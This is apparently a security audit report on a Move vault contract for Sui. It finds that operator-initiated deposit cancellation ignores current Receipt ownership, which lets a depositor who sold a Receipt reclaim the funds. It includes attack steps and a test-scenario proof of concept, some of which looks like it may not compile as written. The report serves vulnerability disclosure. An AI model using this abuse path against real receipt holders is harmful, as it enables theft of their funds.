# Audit Report

## Title
Receipt Transfer Enables Deposit Fund Theft Through Operator Cancellation Path

## Summary
A Time-of-Check-Time-of-Use (TOCTOU) vulnerability exists in the deposit cancellation mechanism. The operator cancellation path validates the recipient address stored at deposit creation time but fails to verify current Receipt ownership, allowing an attacker to transfer their Receipt to a victim, then reclaim buffered coins through operator cancellation while the victim holds a worthless Receipt.

## Finding Description

The Volo Vault implements two distinct deposit cancellation paths with critically different security models:

**User-Initiated Path**: The `user_entry::cancel_deposit` function requires possession of the Receipt object (`&mut Receipt`) and uses `ctx.sender()` as the recipient, ensuring only the current holder can cancel. [1](#0-0) 

**Operator-Initiated Path**: The `operation::cancel_user_deposit` function takes only address parameters (`receipt_id: address`, `recipient: address`) without requiring the Receipt object itself. [2](#0-1) 

The vulnerability arises from three factors:

1. **Receipt Transferability**: The Receipt struct has `key, store` abilities, making it fully transferable via `transfer::public_transfer`. [3](#0-2) 

2. **Stale Recipient Storage**: When creating a deposit request, the system captures `ctx.sender()` as the recipient and permanently stores it in the DepositRequest. [4](#0-3) [5](#0-4) 

3. **Insufficient Ownership Validation**: The core `vault::cancel_deposit` function only verifies that the provided recipient parameter matches the stored recipient from the DepositRequest, with no verification that the Receipt is currently owned by that address. [6](#0-5) 

**Attack Execution**:
1. Alice calls `user_entry::deposit`, creating a DepositRequest with `recipient = Alice's address`
2. Alice transfers the Receipt to Bob using `transfer::public_transfer` (enabled by `store` ability)
3. Alice submits an off-chain cancellation request to the operator with valid signature
4. Operator calls `operation::cancel_user_deposit` with Alice's address as recipient
5. Validation passes: `deposit_request.recipient() == recipient` evaluates to `Alice == Alice`
6. Buffered coins are transferred to Alice [7](#0-6) 
7. Bob holds a Receipt with `pending_deposit_balance` decremented to zero [8](#0-7) 

## Impact Explanation

**Direct Fund Theft**: The vulnerability enables quantifiable theft of user funds:
- Alice deposits X coins and receives a Receipt with pending deposit status
- Alice sells/transfers the Receipt to Bob for value Y (via secondary market, OTC, or as collateral)
- Alice requests operator cancellation using her original address
- Alice receives X coins back while Bob holds a worthless Receipt

**Quantified Loss**: 
- Attacker gain: X (recovered deposit) + Y (payment for Receipt) - gas fees
- Victim loss: Y (amount paid for Receipt with no underlying value)
- Protocol: Reputation damage and potential loss of user trust

**Affected Parties**: Any user who acquires a Receipt with pending deposits through transfer, purchase, or use as collateral becomes vulnerable to the original depositor reclaiming the buffered funds.

The VaultReceiptInfo is correctly updated (status reset, pending_deposit_balance decremented), but this offers no protection to the Receipt holder who now owns a Receipt with zero pending value.

## Likelihood Explanation

**Highly Feasible Attack Path**:
1. All entry points are standard public functions accessible to regular users
2. The operator path requires only legitimate `OperatorCap` authentication
3. Receipt transfer is enabled by design through `key, store` abilities
4. No privileged capabilities beyond normal user and operator roles are required

**Operator Involvement Without Malice**: The operator does not need to be malicious or compromised. Following standard operational procedures, the operator would:
- Verify the cancellation request is cryptographically signed by the stored recipient address (Alice)
- Check that the locking period has elapsed
- Execute the cancellation as requested

The operator has no mechanism to detect that the Receipt has been transferred, as the protocol itself enforces no verification of current Receipt ownership when using the operator cancellation path.

**Economic Rationality**: The attack is profitable whenever Receipts can be transferred for value, which is likely in scenarios such as:
- Secondary market trading of vault receipts
- Using Receipts as collateral in lending protocols
- OTC sales of deposit positions

## Recommendation

Add a verification in the operator cancellation path to ensure the Receipt is currently owned by the recipient address. This can be implemented by:

1. **Option 1 - Require Receipt Object**: Modify `operation::cancel_user_deposit` to require the Receipt object as a parameter, similar to the user-initiated path.

2. **Option 2 - On-Chain Ownership Check**: Implement an on-chain check that verifies the Receipt object at `receipt_id` is owned by the `recipient` address before proceeding with cancellation.

3. **Option 3 - Disable Operator Cancellation**: Remove the operator cancellation path entirely, requiring all cancellations to go through the user-initiated path which inherently validates ownership through object possession.

The recommended approach is **Option 1**, as it maintains consistency with the user-initiated cancellation security model and leverages Sui's ownership semantics.

## Proof of Concept

```move
#[test]
// [TEST-CASE: Receipt transfer enables deposit theft via operator cancellation]
public fun test_receipt_transfer_theft_via_operator_cancel() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);
    
    const ALICE: address = @0xA11CE;
    const BOB: address = @0xB0B;
    
    // Step 1: Alice deposits 1000 tokens
    s.next_tx(ALICE);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 1_000_000_000,
            2_000_000_000, option::none(), &clock, s.ctx()
        );
        
        transfer::public_transfer(coin, ALICE);
        transfer::public_transfer(receipt, ALICE);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Step 2: Alice transfers Receipt to Bob
    s.next_tx(ALICE);
    {
        let receipt = s.take_from_sender<Receipt>();
        transfer::public_transfer(receipt, BOB); // Alice transfers to Bob
    };
    
    // Step 3: Operator cancels deposit to Alice's address
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        
        // Get receipt_id from Bob's ownership
        s.next_tx(BOB);
        let receipt = s.take_from_sender<Receipt>();
        let receipt_id = receipt.receipt_id();
        s.return_to_sender(receipt);
        
        s.next_tx(OWNER);
        // Operator cancels to ALICE (original depositor) even though BOB owns Receipt
        operation::cancel_user_deposit<SUI_TEST_COIN>(
            &operation, &operator_cap, &mut vault,
            0, receipt_id, ALICE, &clock  // Sends coins to ALICE
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        s.return_to_sender(operator_cap);
    };
    
    // Step 4: Verify theft - Alice received coins, Bob has worthless Receipt
    s.next_tx(ALICE);
    {
        let coin = s.take_from_sender<Coin<SUI_TEST_COIN>>();
        assert!(coin.value() == 1_000_000_000); // Alice got her deposit back
        s.return_to_sender(coin);
    };
    
    s.next_tx(BOB);
    {
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let receipt = s.take_from_sender<Receipt>();
        let vault_receipt_info = vault.vault_receipt_info(receipt.receipt_id());
        
        // Bob's Receipt now has zero pending balance - he was robbed
        assert!(vault_receipt_info.pending_deposit_balance() == 0);
        assert!(vault_receipt_info.status() == 0);
        
        test_scenario::return_shared(vault);
        s.return_to_sender(receipt);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

### Citations

**File:** volo-vault/sources/user_entry.move (L52-58)
```text
    let request_id = vault.request_deposit(
        split_coin,
        clock,
        expected_shares,
        receipt_id,
        ctx.sender(),
    );
```

**File:** volo-vault/sources/user_entry.move (L91-103)
```text
public fun cancel_deposit<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    receipt: &mut Receipt,
    request_id: u64,
    clock: &Clock,
    ctx: &mut TxContext,
): Coin<PrincipalCoinType> {
    vault.assert_vault_receipt_matched(receipt);

    let coin = vault.cancel_deposit(clock, request_id, receipt.receipt_id(), ctx.sender());

    coin
}
```

**File:** volo-vault/sources/operation.move (L435-447)
```text
public fun cancel_user_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    request_id: u64,
    receipt_id: address,
    recipient: address,
    clock: &Clock,
) {
    vault::assert_operator_not_freezed(operation, cap);
    let buffered_coin = vault.cancel_deposit(clock, request_id, receipt_id, recipient);
    transfer::public_transfer(buffered_coin, recipient);
}
```

**File:** volo-vault/sources/receipt.move (L12-15)
```text
public struct Receipt has key, store {
    id: UID,
    vault_id: address, // This receipt belongs to which vault
}
```

**File:** volo-vault/sources/volo_vault.move (L730-738)
```text
    let new_request = deposit_request::new(
        current_deposit_id,
        receipt_id,
        recipient,
        self.id.to_address(),
        amount,
        expected_shares,
        clock.timestamp_ms(),
    );
```

**File:** volo-vault/sources/volo_vault.move (L783-783)
```text
    assert!(deposit_request.recipient() == recipient, ERR_RECIPIENT_MISMATCH);
```

**File:** volo-vault/sources/vault_receipt_info.move (L57-63)
```text
public(package) fun update_after_cancel_deposit(
    self: &mut VaultReceiptInfo,
    cancelled_deposit_balance: u64,
) {
    self.status = NORMAL_STATUS;
    self.pending_deposit_balance = self.pending_deposit_balance - cancelled_deposit_balance;
}
```
